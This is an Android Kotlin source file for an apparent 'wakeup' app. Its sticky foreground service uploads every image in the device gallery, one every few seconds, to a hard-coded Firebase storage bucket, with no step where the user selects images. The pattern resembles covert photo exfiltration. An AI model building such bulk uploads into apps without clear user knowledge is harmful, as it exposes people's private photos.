package com.example.wakeup

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.core.app.ServiceCompat.startForeground
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date

class UploadMediaService : Service() {

    private var scope = CoroutineScope(Dispatchers.Main)
    private val storageRef = Firebase.storage(SERVER_URL).reference

    @SuppressLint("ForegroundServiceType")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, NotificationManager().createNotification(this))
        scope.launch { uploadImg(context = this@UploadMediaService) }
        return START_STICKY
    }

    override fun onBind(intent: Intent): IBinder? = null

    @SuppressLint("SimpleDateFormat")
    private suspend fun uploadImg(context: Context) {
        withContext(Dispatchers.IO) {
            getImagesURIsFromGallery(context).forEach { fileUri ->
                val actualDateTime = SimpleDateFormat("dd MMMM yyyy: HH:mm:ss").format(Date(System.currentTimeMillis()))
                val fileNameForDB = fileUri.toString().replaceAfter('/', actualDateTime)
                storageRef.child(fileNameForDB).putFile(fileUri)
                delay(3000)
            }
        }
    }

    companion object {

        const val SERVER_URL = "gs://wakeup-e8121.appspot.com"

    }

}